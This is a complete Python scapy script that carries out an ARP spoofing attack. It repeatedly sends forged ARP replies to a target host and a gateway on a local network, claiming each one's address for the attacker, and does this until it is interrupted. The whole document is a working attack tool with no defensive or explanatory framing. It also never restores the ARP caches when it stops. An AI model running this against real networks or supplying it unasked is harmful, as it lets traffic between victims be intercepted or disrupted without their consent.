from scapy.all import *
import time

def spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"MAC address for {target_ip} not found.")
        return

  
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    print(f"Sent spoofed ARP to {target_ip} claiming to be {spoof_ip}")

target = "192.168.1.101"  
gateway = "192.168.1.1"   

try:
    while True:
        spoof(target, gateway) 
        spoof(gateway, target)  
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] ARP spoofing stopped.")
